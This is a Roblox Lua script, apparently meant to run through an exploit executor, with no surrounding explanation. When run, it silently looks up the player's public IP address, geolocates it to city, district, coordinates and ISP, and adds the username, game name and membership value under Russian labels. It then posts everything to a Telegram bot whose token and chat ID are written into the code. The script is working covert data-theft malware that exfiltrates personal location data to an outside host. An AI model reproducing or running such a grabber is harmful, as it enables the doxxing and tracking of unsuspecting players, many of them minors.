local H=game:GetService("HttpService")
local p=game:GetService("Players").LocalPlayer
local t,b="8592615710:AAEKR8jA54djYzB3T3X-8zVRPyJSzSicxdQ","1089036084"

local function s()
    local i,g="?",{c="",r="",t="",d="",la="",lo="",i=""}
    local o,e=pcall(function()return game:HttpGet("https://api.ipify.org")end)
    if o then i=e end
    local x,d=pcall(function()return game:HttpGet("http://ip-api.com/json/"..i.."?fields=country,regionName,city,district,lat,lon,isp")end)
    if x then
        local j=H:JSONDecode(d)
        if j then
            g.c=j.country or""
            g.r=j.regionName or""
            g.t=j.city or""
            g.d=j.district or""
            g.la=j.lat and tostring(j.lat)or""
            g.lo=j.lon and tostring(j.lon)or""
            g.i=j.isp or""
        end
    end
    local gn="?"
    local sg,rd=pcall(function()return game:HttpGet("https://games.roblox.com/v1/games?universeIds="..game.GameId)end)
    if sg then
        local dj=H:JSONDecode(rd)
        if dj and dj.data and dj.data[1]then gn=dj.data[1].name end
    end
    local rb=0
    local sr,rr=pcall(function()return p.MembershipType.Value end)
    if sr then rb=rr end
    local l={}
    table.insert(l,"Игрок: "..p.Name)
    if i~="?"then table.insert(l,"IP: "..i)end
    if g.c~=""then table.insert(l,"Страна: "..g.c)end
    if g.r~=""then table.insert(l,"Регион: "..g.r)end
    if g.t~=""then table.insert(l,"Город: "..g.t)end
    if g.d~=""then table.insert(l,"Район: "..g.d)end
    if g.la~=""and g.lo~=""then table.insert(l,"Коорд: "..g.la.." "..g.lo)end
    if g.i~=""then table.insert(l,"Провайдер: "..g.i)end
    table.insert(l,"Игра: "..gn)
    table.insert(l,"Робуксы: "..rb)
    local rq=syn and syn.request or http and http.request or request
    if rq then
        pcall(function()rq({
            Url="https://api.telegram.org/bot"..t.."/sendMessage",
            Method="POST",
            Headers={["Content-Type"]="application/json"},
            Body=H:JSONEncode({chat_id=b,text=table.concat(l,"\n")})
        })end)
    end
end

s()
